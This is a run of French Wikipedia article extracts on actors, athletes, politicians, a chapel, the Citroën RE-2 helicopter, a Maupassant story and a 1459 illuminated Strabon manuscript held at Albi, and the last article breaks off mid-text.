En 2012, il a eu son premier grand rôle dans la comédie dramatique "Struck" puis dans le film dramatique "Crazy Kind of Love". Cette même année, il a eu le rôle principal dans la série dramatique/science-fiction, "Revolution". Au printemps 2013, Graham a tourné le thriller "Careful What You Wish For" aux côtés de Nick Jonas. Le , Graham a annoncé sur son Twitter qu'il venait d'intégrer le casting du film biographique du chanteur Brian Wilson des Beach Boys.
En 2015, il est surtout connu pour son rôle de l'agent du FBI Caleb Haas dans le thriller d'ABC Quantico. En 2017, il interprète Evan "Tuba" Chapin dans la série originale de Netflix "Atypical", dévoilée le .
Vie privée.
Graham a été en couple avec l'actrice Lucy Hale de juin à .
Il est sorti en 2018 avec l'actrice Britt Robertson.

</doc>
<doc id="7280287" url="https://fr.wikipedia.org/wiki?curid=7280287" title="Château d'en Bardou">
Château d'en Bardou



</doc>
<doc id="7280289" url="https://fr.wikipedia.org/wiki?curid=7280289" title="Levon Aghasyan">
Levon Aghasyan

Levon Aghasyan (né le ) est un athlète arménien, spécialiste du triple saut.
Biographie.
Il termine lors des Championnats du monde jeunesse 2011 mais échoue à ses trois sauts en finale des Championnats du monde juniors 2012, avant de dépasser les 16 m lors des Championnats d'Europe juniors 2013 pour remporter la médaille d'or. Il a remporté deux titres nationaux. Son record est de 16,33 m obtenu en 2012.

</doc>
<doc id="7280290" url="https://fr.wikipedia.org/wiki?curid=7280290" title="Christian Savigny">
Christian Savigny

Christian Savigny est un programmateur musical, producteur d'émissions et directeur des programmes de télévision et de radio, né le .
Biographie.
Au cours de ses études à l’École Normale du Mans, il intègre en 1970 en tant que batteur, le groupe local Heaven Road, puis abandonne l’enseignement pour devenir musicien professionnel. Le groupe, rebaptisé Satan, interprète en concert ses propres compositions, gagne le super tremplin 1973 du Golf Drouot, puis sous le nom de Ciel d’Eté, sillonne le circuit des bals rock, dans tout l’ouest de la France.
Il quitte le groupe en 1978, devient DJ puis crée sa propre discothèque en 1979 près du Mans.
Carrière à la radio et à la télévision.
Passionné de radio depuis l’enfance, il rejoint dès juillet 1981 en tant qu’animateur, la première équipe de RFM, où il réalise entre autres les bandes-annonces de l’émission de Coluche. Il devient responsable de l’antenne en 1982, recrute de nouveaux animateurs, dont Laurence Boccolini, et produit le disque de soutien « Radio brouillée ». Il met en place des rendez-vous originaux, dont « Radio Star » où il guide les artistes venus présenter eux-mêmes l’émission à la console (Julien Clerc, Gilbert Montagné…).
En 1984-85, en tant que producteur indépendant, il conçoit une série d’émissions hebdomadaires (Top FM, Kit Parade Société Générale, Gini Parade), dont il assure lui-même les interviews (Serge Gainsbourg, Sting, Jean-Jacques Goldman, Mylène Farmer…). Ces émissions animées par Laurent Boyer sont diffusées chaque semaine en syndication sur plus de 200 stations en France.
Après un passage par l’éphémère Chic FM, il devient en 1987 directeur des programmes de Chérie FM, première radio française à utiliser le logiciel de programmation musicale « Selector ».
En 1989 il rejoint Europe 2, pour y diriger l’antenne parisienne. Simultanément il crée le premier département intégré de recherche musicale dans une radio en France, puis produit Le « Top Albums » en partenariat avec Canal+, et « Eurochart » avec Music &amp; Media (groupe Billboard). En 1991, Marc Garcia le nomme directeur de la programmation musicale d’Europe 2, poste qu’il occupera jusqu’en 1994.
Pendant la même période, il enseigne les techniques de programmation et l’histoire de la musique populaire au Studio Ecole de France.
Consultant et producteur en 1995 et 1996, il mène des missions d’audit et de recherche musicale pour les radios MFM ou RMC à la demande de Jean-Pierre Foucault, et produit le disque « Music Generation » figurant sur la compilation Dance Machine 6 (Polygram/Universal).
En 1997, le réseau Nostalgie fait appel à lui pour diriger sa programmation musicale. Il y crée les « week-ends spéciaux » consacrés à un artiste, les « concerts acoustiques » (Marc Lavoine, Lionel Richie, Louis Chedid, Maurane…). Lors du rachat de la station par le groupe NRJ en 1998, il redéfinit son nouveau format « 60s-70s ». L’audience cumulée de Nostalgie passe de 4 % en 1998 à 7,9 % en 1999 (chiffres Médiamétrie). Selon Télérama, "derrière le réveil spectaculaire de cette Belle au bois dormant des ondes, on trouve [...] Christian Savigny, le responsable de la programmation de la station [...] qui, dans son antre, met au point la recette gagnante [...] avec des tubes, des standards".
En 2000, il crée la web radio « 1000 % Soul » pour le portail internet Com FM.
De 2001 à 2013, en tant que directeur des programmes de Télé Melody, il développe un concept de chaîne de variétés basé sur les archives de l’INA (Institut National de l'Audiovisuel). Il choisit et programme les clips, Scopitones, concerts et shows des années 1960 à 1990, met en place des émissions originales comme le Video-Mix. 
Christian Savigny a conçu de nombreux track-listing de compilations ou coffrets CD, et une collection de 80 DVD « Les fabuleuses années 60-70 » (Del Prado Éditions, 2008-2009), en partenariat avec l’INA, Télé Melody et Nostalgie.
Il a créé le festival d'humour de Nogent-Sur-Marne, intitulé "Nogent Se Marre", qu'il dirige aujourd'hui.

</doc>
<doc id="7280291" url="https://fr.wikipedia.org/wiki?curid=7280291" title="Décembre 1953">
Décembre 1953



</doc>
<doc id="7280294" url="https://fr.wikipedia.org/wiki?curid=7280294" title="Crustacé (homonymie)">
Crustacé (homonymie)

Crustacé est un nom commun qui peut désigner :

</doc>
<doc id="7280295" url="https://fr.wikipedia.org/wiki?curid=7280295" title="Kumarakom">
Kumarakom

Kumarakom (en ) est un village du district de Kottayam, dans l'État du Kerala, en Inde. Établie sur les berges du lac Vembanad, la localité est distante de 16 km à la ville de Kottayam.
Géographie.
Kumarakom est composé de mangrove, de rizières et de cocotiers.
Le village abrite nombre d'espèces de la faune et de la flore. Le "" est un sanctuaire naturel de l'Inde visité par plusieurs espèces d'oiseaux migrateurs. Créé à partir d'initiatives gouvernementales, il s'étend sur environ 14 acres ( m2). 
Le lac Vembanad, plus grand lac du Kerala, est l'habitat de plusieurs espèces marines.
Économie.
Le village vit de pêche, d'agriculture et de tourisme. En plus du riz et de la noix de coco, on y cultive la banane, la mangue, le jacquier, l'ambazhanga, le puli, le chaambenga, le peraycka, l'aathaycka et l'ananas. On y cultive également le cacao et le café ainsi que le chena et le chembu, cultivé au pied des cocotiers. 

</doc>
<doc id="7280298" url="https://fr.wikipedia.org/wiki?curid=7280298" title="Chapelle Notre-Dame de Trémalo">
Chapelle Notre-Dame de Trémalo

Notre-Dame de Trémalo est une chapelle catholique située dans la commune de Pont-Aven, en Bretagne. L'édifice a été construit au par Guillaume du Plessis, seigneur du Plessis (Quinquis en breton) et Catherine de Botigneau son épouse, il est situé dans l'ancienne paroisse de Nizon.
De style gothique, la chapelle et son mobilier sont connus pour avoir été représentés par les peintres en résidence à Pont-Aven aux . La sculpture en bois polychrome du christ en croix qu'elle contient figure notamment dans plusieurs tableaux de Paul Gauguin, comme "Le Christ jaune" et "Autoportrait au Christ jaune", peints en 1889.
L'édifice est inscrit sur la liste des monuments historiques depuis le .
Histoire.
Fondée par la famille du Plessis et construite en 1550 la chapelle passe ensuite à la famille Feydeau puis à la famille Hersart de la Villemarqué. Vendue comme bien national en 1795 elle retourne à la famille de la Villemarqué sous le premier Empire. Tombée en ruines, elle bénéficie d'une restauration complète en 1957. L"'association pour la sauvegarde de la chapelle de Trémalo", créée en 1978, veille sur son entretien.
Architecture.
Extérieurs.
Construction en granite de plan rectangulaire avec chevet plat triangulaire à l'est, orné de trois baies flamboyantes et clocher de type cornouaillais en pierre ajourée surmontant la façade ouest. Contreforts aux quatre angles. Ouverture au sud par deux portes et à l'ouest par le porche principal.
Intérieurs.
Divisé en trois vaisseaux par dix piliers supportant des arcs brisés, le volume intérieur est homogène, rythmé par les poutres à engoulants de la nef centrale et orné des motifs polychromes des sablières.
Les poutres sablières portant la voute lambrissée en châtaignier sont décorées de figures grotesques, masques d'hommes et d'animaux dans la tradition des images populaires. L'une des sablières montre, sculptée, un animal serrant entre ses dents un sexe masculin.
Les armoiries de Guillaume du Plessis et de son épouse Catherine de Botigneau y figurent près du chœur.
Notes et références.
4 "Trémalo, la chapelle du Christ jaune", YP. Castel et C. Puget, édition Amis du Musée de Pont-Aven 2007
Voir aussi.
Bibliographie.
Castel Yves-Pascal et Puget Catherine, "Trémalo, la chapelle du Christ jaune", Amis du Musée de Pont-Aven, imprimerie régionale, Bannalec, 2007

</doc>
<doc id="7280307" url="https://fr.wikipedia.org/wiki?curid=7280307" title="Ala (Hala)">
Ala (Hala)



</doc>
<doc id="7280308" url="https://fr.wikipedia.org/wiki?curid=7280308" title="Guillaume de Grandchamp de Grantrie">
Guillaume de Grandchamp de Grantrie



</doc>
<doc id="7280309" url="https://fr.wikipedia.org/wiki?curid=7280309" title="Benito Gutmacher">
Benito Gutmacher

Benito Gutmacher, né le à Buenos Aires, Argentine, est un acteur, auteur et directeur de théâtre.
Biographie.
Fils d'immigrants juifs polonais, Gutmacher suit a Buenos Aires des études de théâtre, de l'expression corporelle, de chant. En 1970, il fait son début comme acteur dans "La Danse du sergent Musgrave" de John Arden. En 1971, il part pour l'Europe et présente à Paris en sa première création solo "Le Cri du Corps", dans une librairie café-théâtre Les Anamorphoses située rue de Vaugirard. Il est tout de suite remarqué par la presse parisienne, Colette Godard du journal "Le Monde" et "Le Figaro" le comparent avec un disciple des théories d'Antonin Artaud. Il est invité par Jean-Louis Barrault au théâtre des Nations et se présente en au théâtre Récamier. Son spectacle est basé sur le corps et le mouvement presque sans paroles, et Gutmacher jouera cette pièce pendant plus de 25 ans avec un succès international qui l'amènera dans plusieurs théâtres et festivals en Europe et Amérique, de Paris à New York en passant par Mexico, Sao Paulo, Zurich, Berlin, Vienne, Varsovie, Amsterdam, Turin etc. En 1975, après une production au "Teatro Regina" à Buenos Aires, il est mentionné dans le journal Clarín comme un des meilleurs acteurs de l'année. En 1978, il rencontre Alejandro Jodorowsky qui lui propose de présenter son spectacle "Tarot" à Paris. En 1990, il se produit au La MaMa Experimental Theatre Club à New York et est décrit dans "The New York Times" comme « virtuose du mouvement. »
Entre-temps d'autres créations solo se suivent : "Hamlet' 74" (Paris, 1974), "Le Tarot" (Paris, 1980), "Business-Business" (Fribourg (Allemagne), 1983), "Papier de Toilette et Art" (Fribourg, 1997). Il participe comme acteur dans plusieurs productions, notamment avec les comédiens argentins Carlos Trafic et Héctor Malamud, avec lesquels il présente en Allemagne "Initiation" et "La Provocation à Shakespeare" et se produit dans des festivals de théâtre internationaux. 
En 1976, l'acteur Héctor Malamud lui propose la mise en scène de son one-man-show People love me, ce qui amorce le début d'une nouvelle vocation. Depuis, il a monté comme coauteur et metteur en scène plus de 25 pièces de théâtre, surtout en Allemagne, dont une adaptation de la "Lettre au père" de Franz Kafka. Il dirige aussi l'acteur américain Stephan Schulberg qui appartient au groupe "Living Theatre" dirigé par Julian Beck et Judith Malina. Il donne des dizaines de cours et de séminaires pour la formation des acteurs dans plusieurs pays d'Europe et d'Amérique latine.
Gutmacher est marié, il a quatre enfants et vit depuis 1981 dans la ville de Fribourg-en-Brisgau, en Allemagne.

</doc>
<doc id="7280313" url="https://fr.wikipedia.org/wiki?curid=7280313" title="Philippe Octave Amédée de Barral">
Philippe Octave Amédée de Barral

Philippe Octave Amédée de Barral est un militaire et homme politique français né le à Voiron (Isère) et mort le au château de Moisse, à Bétête (Creuse).
Biographie.
Il est le fils d'André de Barral, général de brigade, préfet du Cher, et d'Anne de Beauharnais. cousine germaine d'Alexandre de Beauharnais, époux de la future impératrice Joséphine de Beauharnais.
Page de Napoléon Ier, il entre dans l'armée et fait la campagne d'Espagne comme capitaine de cavalerie. Il est fait prisonnier par les Anglais en 1812. Conseiller général de l'Isère, il est nommé préfet du Cher en 1852. Il est député du Cher de 1854 à 1856 et sénateur du Second Empire de 1856 à 1870, soutenant le régime.
Il avait épousé Marie Alexandrine Robin de Scévole (1798-1838), fille de François Robin de Scévole, maire d'Argenton-sur-Creuse et député de l'Indre. Octave de Barral et son épouse sont enterrés à Voiron.

</doc>
<doc id="7280318" url="https://fr.wikipedia.org/wiki?curid=7280318" title="Jean Bidault">
Jean Bidault

Jean Joseph Bidault est un homme politique français né le à Dun-sur-Auron (Cher) et mort le à Crézançay-sur-Cher (Cher).
Biographie.
Avocat à Saint-Amand-Montrond en 1820, il est un opposant à la Restauration. Il est conseiller municipal de Saint-Amand-Montrond après 1830. Il est sous-commissaire du gouvernement à Saint-Amand-Montrond en 1848 et député du Cher de 1848 à 1849, et de 1850 à 1854, siégeant d'abord dans le groupe de Cavaignac, puis à droite. Rallié au Second Empire, il siège dans la majorité dynastique.

</doc>
<doc id="7280320" url="https://fr.wikipedia.org/wiki?curid=7280320" title="Citroën RE-2">
Citroën RE-2

Le Citroën RE-2 est un hélicoptère léger expérimental, développé dans les années 1970 par le constructeur automobile Citroën. Les travaux furent confiés à Charles Marchetti, ancien chef ingénieur de la SNCASE, avec l'aide de Theodor Laufer qui avait réalisé le SNCASO SO.1221 Djinn à la Société nationale des constructions aéronautiques du Sud-Ouest.
Développements.
C'est en 1973 que les équipes de Charles Marchetti et de Citroën se mirent à travailler ensemble sur le programme de développement du futur RE-2. Il s'agissait alors de développer un hélicoptère biplace capable de concurrencer le Bell 47 alors largement présent sur le marché français. L'idée était aussi de diversifier l'activité du constructeur. Une partie de la sous-traitance industrielle fut confiée à Hurel-Dubois.
Les travaux furent menés assez rapidement et le le prototype du Citroën RE-2 réalisait son premier vol depuis un terrain d'aviation situé à La Ferté-Vidame. Malgré de bonnes qualités de vol, l'appareil ne réalisa que quelques vols d'essais entre 1975 et 1977. Il ne réussit jamais à obtenir un certificat de navigabilité permanent, se limitant à un temporaire délivré entre janvier et .
Le Citroën RE-2 réalisa son dernier vol le avant d'être convoyé jusqu'au musée Citroën, installé dans l'enceinte même de l'usine PSA d'Aulnay-sous-Bois en Seine-Saint-Denis. Il semble acquis que ce programme était très onéreux pour le constructeur.
Architecture générale.
Le Citroën RE-2 se présente sous la forme d'un hélicoptère léger biplace côte à côte à cockpit fermé. Son moteur à piston rotatif Wankel d'une puissance de 190 chevaux entraîne le rotor principal et le rotor anticouple, respectivement à 3 et 4 pales. La structure même de l'appareil fait massivement appel au métal.

</doc>
<doc id="7280326" url="https://fr.wikipedia.org/wiki?curid=7280326" title="Alexander Wachter">
Alexander Wachter

Alexander Wachter, né le à Pfunds, est un coureur cycliste autrichien. En 2012, il devient champion d'Europe sur route juniors.

</doc>
<doc id="7280329" url="https://fr.wikipedia.org/wiki?curid=7280329" title="La Bête à Maît' Belhomme">
La Bête à Maît' Belhomme

La Bête à Maît' Belhomme est une nouvelle de Guy de Maupassant, parue en 1885.
Historique.
"La Bête à Maît' Belhomme" est une nouvelle écrite par Guy de Maupassant et publiée initialement dans le quotidien "Gil Blas" du , avant d'être reprise dans le recueil "Monsieur Parent".
Résumé.
Un jour où plusieurs personnes montèrent dans une roulotte, un homme nommé Maître Belhomme grimaça tout en tenant un mouchoir contre son oreille. Il y a les autres personnes dont un curé, un instituteur, Maître Rabot et maître Caniveau lui demandèrent ce qu'il avait.
Ses compagnons de voyage apprennent qu'il est persuadé qu'une bête est entrée par son oreille et est en train de lui manger le cerveau. Au long du voyage, un débat apparaîtra pour savoir quelle bête lui mangea le cerveau (chenille, araignée, mouche…). Le voyage ne va pas être facile pour Maître Belhomme qui pousse des cris de plus en plus horribles.
Mais grâce à Maître Caniveau qui eut l'idée de mélanger de l'eau-de-vie et du vinaigre pour essayer de la noyer, il réussit à la tuer et ils découvrirent quelle bête était dans son oreille.
C'était une puce !

</doc>
<doc id="7280336" url="https://fr.wikipedia.org/wiki?curid=7280336" title="Guillaume de Duranti-Concressault">
Guillaume de Duranti-Concressault

Guillaume de Duranti-Concressault est un homme politique français né le à Paris et mort le à Blancafort (Cher).
Biographie.
Militaire, il prend sa retraite avec le grade de chef d'escadron. Maire de Blancafort, il est conseiller général du canton d'Argent-sur-Sauldre de 1833 à 1836, puis député du Cher de 1852 à 1856, siégeant dans la majorité dynastique.

</doc>
<doc id="7280338" url="https://fr.wikipedia.org/wiki?curid=7280338" title="Flashback (roman)">
Flashback (roman)

Flashback (titre original : "") est un roman de science-fiction de l'écrivain américain Dan Simmons publié en 2011. Le roman a fait l'objet d'une traduction française effectuée par Patrick Dusoulier et parue en aux éditions Robert Laffont.
"Flashback" est une version augmentée de la nouvelle "Flash-back", incluse dans le recueil "L'Amour, la Mort" publié en 1993.
Résumé.
L’action de ce thriller politique, à l’atmosphère proche du cyberpunk, se déroule vraisemblablement en 2032, dans un monde où le Moyen-Orient s’est unifié en un vaste califat, à la sphère d’influence duquel appartiennent une Union européenne et un Canada politiquement et économiquement très affaiblis (quant à Israël, il a été atomisé), un monde où le Japon, redevenu une puissance militaire et rétablissant sa structure féodale, mène des opérations guerrières en Chine et en Asie du Sud-Est, et où l’Inde et le Brésil se disputent la place de troisième pôle de cette nouvelle « Triade ».
Les États-Unis, en faillite, sont quant à eux en cours de désintégration et n'ont plus aucune influence politique mondiale. Plusieurs de leurs États ont proclamé leur indépendance, et le Nouveau-Mexique ainsi qu’une partie de la Californie ont été envahis par les Hispaniques de la "Reconquista".
Le personnage principal du récit est un certain Nick Bottom, un ex-policier de Denver. À la suite du décès accidentel de sa femme six ans plus tôt, il a commencé à consommer du « flashback », une nouvelle drogue permettant de revivre n’importe quel souvenir dans le moindre détail. Comme lui, une majorité d’Américains de l’époque décrite souffre d’une addiction à cette drogue, ce qui a pour résultat que la plus grande partie de la population fuit en permanence la réalité quotidienne.
Un multimilliardaire japonais, Hiroshi Nakamura, engage Nick Bottom, afin qu’il mène une enquête sur le meurtre de son fils Keigo, non élucidé depuis six ans. Cette investigation mettra en contact l’ex-policier avec les sphères dirigeantes de ce monde et l’amènera à découvrir les secrets du « flashback ».

</doc>
<doc id="7280340" url="https://fr.wikipedia.org/wiki?curid=7280340" title="Antiémeute">
Antiémeute



</doc>
<doc id="7280341" url="https://fr.wikipedia.org/wiki?curid=7280341" title="Police antiémeutes">
Police antiémeutes



</doc>
<doc id="7280342" url="https://fr.wikipedia.org/wiki?curid=7280342" title="Antiémeutes">
Antiémeutes



</doc>
<doc id="7280343" url="https://fr.wikipedia.org/wiki?curid=7280343" title="Anti-émeute">
Anti-émeute



</doc>
<doc id="7280344" url="https://fr.wikipedia.org/wiki?curid=7280344" title="Anti-émeutes">
Anti-émeutes



</doc>
<doc id="7280346" url="https://fr.wikipedia.org/wiki?curid=7280346" title="Simón Castro">
Simón Castro

Simón Castro Alfonseca (né le à San José de los Llanos, San Pedro de Macorís, République dominicaine) est un ancien lanceur droitier qui a joué de 2013 à 2017 dans la Ligue majeure de baseball.
Carrière.
Simón Castro signe son premier contrat professionnel en 2006 avec les Padres de San Diego. Ceux-ci l'échangent aux White Sox de Chicago avec le lanceur gaucher Pedro Hernández le en retour du voltigeur Carlos Quentin.
Castro fait ses débuts dans le baseball majeur comme lanceur de relève pour les White Sox le . Il apparaît dans 4 matchs de l'équipe en 2013.
Il rejoint les Rockies du Colorado le .
Castro joue pour les Athletics d'Oakland en 2017.
En relève à Chris Smith, Sean Doolittle et Tucker Healy, Simón Castro complète dans les ligues mineures un match sans coup sûr combiné pour les Sounds de Nashville, un club-école des Athletics d'Oakland, le contre les Storm Chasers d'Omaha.

</doc>
<doc id="7280347" url="https://fr.wikipedia.org/wiki?curid=7280347" title="Simon Castro">
Simon Castro



</doc>

<doc id="9411190" url="https://fr.wikipedia.org/wiki?curid=9411190" title="De situ orbis d'Albi">
De situ orbis d'Albi

Le conservé à la bibliothèque d'Albi ( 77) est un manuscrit enluminé de la "Géographie" de Strabon, d'origine italienne, daté de 1459.
Traduit du grec ancien en latin par Guarino de Vérone sur commande du général vénitien Jacopo Antonio Marcello, ce texte de Strabon a été offert à René d'Anjou, comme cadeau diplomatique le 13 septembre 1459. Il fait partie d'un ensemble de livres envoyés par le militaire italien au prince français, tous deux bibliophiles et passionnés de culture antique. Le manuscrit de prestige est écrit sans doute à Padoue dans le style humaniste et doté de remarquables lettrines à facette inspirées de l'Antiquité. Il est surtout décoré de deux miniatures, conçues comme de véritables petits tableaux et représentant le traducteur, le commanditaire et le destinataire de l'ouvrage. Bien qu'ayant fait l'objet de nombreuses attributions par les historiens de l'art, elles sont généralement données de nos jours au peintre Giovanni Bellini. Elles ont contribué à importer en France le style de la Renaissance italienne, particulièrement dans les nombreux manuscrits enluminés du roi René. Le manuscrit arrive sans doute à Albi dès la fin du ou au début du siècle suivant dans les collections de la bibliothèque de la cathédrale de la ville.
Historique du manuscrit.
Traduction et fabrication.
Guarino de Vérone (1370-1460), un humaniste italien installé alors à Ferrare, réalise, à la demande du pape , la traduction de la "Géographie" de l'auteur grec antique Strabon en latin. C'est ce qu'indique la dédicace du présent manuscrit. En réalité, le pape fait appel conjointement à un autre traducteur, le romain Gregorio Tifernate qui doit travailler sur la seconde partie de l'ouvrage. Cependant, la mort du pape en 1455 interrompt leurs travaux. Le militaire et sénateur vénitien Jacopo Antonio Marcello (1399-1464) commande au seul Guarino l'achèvement de cette traduction. Ce dernier traduit alors la totalité de l'ouvrage, y compris la partie auparavant dévolue à Tifernate. Marcello reçoit son manuscrit parachevé le 13 juillet 1458. 
Marcello fait faire aussitôt deux copies dont l'une de prestige de ce texte, qui constitue le manuscrit d'Albi, entre 1458 et 1459. Une fois la copie achevée et enluminée, elle est offerte à René d'Anjou, roi de Naples comme l'atteste la dédicace datée du .
Un cadeau vénitien à René d'Anjou.
Le manuscrit d'Albi appartient à un ensemble de livres précieux échangés entre le général vénitien et le prince français. La république de Venise, dont le général est l'un des représentants, a en effet soutenu un temps les prétentions de René d'Anjou à la tête du royaume de Naples. René d'Anjou s'est battu contre pour conquérir le royaume napolitain, la dernière reine , sans enfant, ayant désigné, l'un après l'autre, les deux princes à sa succession par testament. René d'Anjou combat entre 1438 et 1442 le roi d'Aragon en Italie mais sans succès. En remerciement de son soutien, Marcello est admis au sein de l'ordre de chevalerie du Croissant, créé par René en 1448, en même temps que Francesco Sforza, qui a lui aussi soutenu le prince français. Dès cette période, le général vénitien fait parvenir des ouvrages à René d'Anjou et à sa femme Isabelle de Lorraine. Une véritable amitié intellectuelle se crée ainsi, fondée sur un même goût pour les livres et les auteurs antiques. Une dizaine d'envois d'ouvrages sont recensés au total, tous identifiés grâce à la dédicace présente au début des manuscrits. 
Par un retournement d'alliance, Venise se retrouve finalement allié à , le concurrent et vainqueur de René à Naples, contre les Sforza, arrivés au pouvoir à Milan en 1450. Marcello souhaite maintenir l'alliance avec les Français et conserver de bonnes relations avec René d'Anjou. Il lui fait alors parvenir, en 1453, une "Passion de saint Maurice et de ses compagnons", saint protecteur de l'ordre du Croissant, dont une partie des miniatures est déjà attribuée à Giovanni Bellini ou à son père Jacopo. Le militaire vénitien, devenu gouverneur de Padoue peu après, adresse au prince angevin le un autre ouvrage enluminé : une traduction en latin de la "Géographie" (') de Claude Ptolémée, accompagnée d'une mappemonde, d'une sphère, ainsi que de descriptions et cartes de la Terre sainte. Cet ouvrage est produit par un copiste et un enlumineur de la ville. ' semble être le dernier manuscrit de cette série d'échanges diplomatiques, interrompue par la mort du fils de Marcello et son départ pour Udine en 1461.
Destinée.
Le parcours du manuscrit de Strabon entre les mains de René d'Anjou et après sa mort n'est pas connu avec précision. Le doute subsiste toujours sur la manière dont il est arrivé à Albi. La tradition veut que l'ouvrage soit parvenu dans la cité tarnaise sous l'épiscopat de Louis d'Amboise entre 1474 et 1503. Ce dernier a été conseiller des rois de France et a légué l'ensemble de sa riche bibliothèque à la cathédrale albigeoise. Cependant, il existe aussi des liens étroits entre le manuscrit et l'évêque de la ville précédent, Jean Jouffroy, en fonction entre 1462 et 1473. Ce dernier est en effet un proche du roi René pour lequel il effectue des missions diplomatiques en Italie. C'est un bibliophile qui n'hésite pas à piller les bibliothèques des abbayes dont il est l'abbé commendataire pour y prélever des manuscrits contenant des textes antiques rares et anciens. De plus, il a entretenu des liens avec Guarino de Vérone : il a participé avec lui au concile de Ferrare en 1438, il est présent en Italie lorsque la traduction de Strabon est achevée en 1458 et l'humaniste italien accepte de se charger de l'éducation du neveu du prélat français. Enfin, ce dernier possède une "", traduite en latin par le fils de Guarino. L'historien de l'art François Avril a réussi à déterminer qu'un groupe de manuscrits enluminés ayant appartenu à René d'Anjou a été conservé un temps à la bibliothèque du chapitre de la cathédrale d'Albi avant d'être dispersé dans des collections étrangères. Après la Révolution française, les manuscrits de la cathédrale entrent dans les collections de la bibliothèque publique de la ville, d'abord à l'hôtel de Rochegude puis dans le bâtiment actuel de la médiathèque Pierre Amalric. 
La reliure de l'ouvrage date des années 1900, mais il possédait jusqu'à cette époque encore sa reliure originale du . Celle-ci était décorée de dorures à chaud, l'une des plus anciennes connues en Europe. Cette reliure était cependant très abîmée et son dos avait été refait au . Après le changement de reliure, la couverture originale a été conservée à part, mais elle a depuis été perdue à l'occasion d'un prêt pour étude à la bibliothèque de l'Arsenal à Paris dans les années 1960. Elle n'est plus connue que par un relevé effectué par le relieur du début du .
Description.
Composition de l'ouvrage et son texte.
Le manuscrit contient 389 folios. Le texte en latin contient : 
Le manuscrit autographe de Guarino de Vérone, avec ses annotations, conservé à la bibliothèque bodléienne d'Oxford, permet de reconstituer la formation du texte du manuscrit d'Albi. Contrairement à ce qu'il indique dans sa dédicace, le texte n'a pas été traduit à partir du manuscrit en grec ancien conservé dans les collections du cardinal grec Ruthenus. En effet, les livres à ont été traduits à partir d'un autre manuscrit grec appartenant à Cyriaque d'Ancône. Les livres à ont été traduits à partir d'un manuscrit aujourd'hui à Moscou. Ces deux manuscrits contiennent des annotations de la main de Guarino. En fait, le manuscrit de Ruthenus ne lui a été envoyé par le bibliothécaire du pape qu'en septembre 1453, soit après le début du travail de Guarino. Ce dernier manuscrit lui a probablement servi à réviser sa traduction. Le manuscrit original d'Oxford contient aussi la deuxième et la troisième épître : elles ne sont pas écrites de la main du traducteur, mais elles ont été corrigées par lui.
Les épîtres préliminaires marquent le rôle diplomatique de l'ouvrage et sont à chaque fois l'occasion de glorifier le destinataire. Dans la lettre de Guarino à , l'auteur compare le pape au Christ qui ressuscite Lazare lorsqu'il commande de traduire le texte de Strabon pour le faire redécouvrir à l'Occident chrétien. Il compare plus loin, dans la même lettre, le texte de Strabon à la "Septante", une traduction de la bible hébraïque en grec qui a été ordonnée par le roi d'Égypte vers 270 avant J.-C. Dans sa lettre à Marcello, Guarino compare ce dernier cette fois-ci à Hercule qui supporte le globe à la place d'Atlas, tout comme le général vénitien a pris le relai du pape dans le soutien à la traduction de la "Géographie". Enfin, dans la lettre de Marcello à René d'Anjou, le vénitien indique au prince français tous les autres cadeaux qu'il aurait pu lui faire en lieu et place de ce livre : des oiseaux, des chevaux, des chiens ou des vases précieux, mais selon lui, l'œuvre d'un génie était bien plus appropriée à un seigneur de son rang.
L'écriture.
L'écriture de l'ouvrage d'Albi est de style humaniste. Le copiste du manuscrit est sans doute en activité entre Padoue et Venise dans les années 1460-1470. Son écriture a été retrouvée dans un groupe de manuscrits dont un ouvrage contenant des textes consolatoires dédicacé à Marcello en 1461, à l'occasion de la mort de son fils, un manuscrit du "", ou encore des ouvrages destinés aux humanistes et prélats Jean Vitéz et Hermolao Barbaro. Les titres sont écrits en polychromie, rappelant l'écriture d'un copiste humaniste padouan notoire, Bartolomeo Sanvito, actif à la cour du pape dans le dernier tiers du . Ce dernier pourrait avoir été influencé ou formé par le copiste du présent manuscrit.
Les lettrines.
Comme dans les manuscrits de Sanvito, le manuscrit de Strabon contient 23 lettrines à facette, dites aussi prismatiques. Inspirées des capitales romaines, elles sont traitées de manière à donner l'impression d'un relief, placées sur un fond de couleur orné de rinceaux et d'imitations de clous qui permettraient de les fixer à la page. Ce type de lettrine se retrouve dans le manuscrit de la "Cosmographie" de Ptolémée déjà offert à René d'Anjou en 1457. L'historien de l'art américain Millard Meiss a avancé l'hypothèse qu'il s'agirait d'une œuvre de jeunesse d'Andrea Mantegna, qui s'est intéressé à l'épigraphie antique à cette époque, à tel point que ce type de lettrines a été surnommé '. Mais cette attribution n'a pas été retenue par les autres historiens. Ce style de lettre existe déjà dans d'autres ouvrages padouans et s'est diffusé un peu partout en Italie à la Renaissance. C'est le cas dans un manuscrit de Sanvito, le ' de saint Jérôme.
Les miniatures.
Description.
Le manuscrit est surtout célèbre pour ses deux miniatures en pleine page, situées entre les deuxième et troisième épîtres. La première (f.3v.) représente à droite le traducteur Guarino de Vérone, vêtu d'une grande toge rouge de docteur, donnant son ouvrage au commanditaire, Jacopo Antonio Marcello, placé à gauche, vêtu d'un pourpoint court recouvert d'une cape faite d'un tissu de brocart orange. Le portrait du traducteur est peut-être inspiré d'une médaille de Matteo de' Pasti gravée quelques années plus tôt. Le général vénitien est, quant à lui, représenté âgé, les traits beaucoup plus marqués que sur le portrait de la "Passion de saint Maurice". Ces deux personnages sont accompagnés de jeunes hommes. Parmi eux, se trouvent peut-être d'un côté le fils de Marcello, Valerio, et de l'autre, le fils de Guarino, Battista, vêtu d'une toge pourpre, car il est lui aussi professeur. La scène se déroule devant un arc surmonté d'un fronton triangulaire entouré d'un halo bleu. La deuxième miniature (f.4r.) représente Marcello donnant son ouvrage, doté de sa reliure originale, à René d'Anjou. Le premier est agenouillé devant le prince français, qui est assis sur un trône. Celui-ci, inspiré de la sculpture toscane, est décoré d'un bas-relief représentant un lapin et un lion, surmontés de l'inscription latine (« Auguste clémence »). Cette dernière fait référence à la différence de rang entre les deux personnes. Le prince français est coiffé d'un chapeau à bords ronds et chaussé de poulaines. Le paysage à l'arrière-plan est occupé par un palmier et des bâtiments dessinant une perspective régulière.
Attribution.
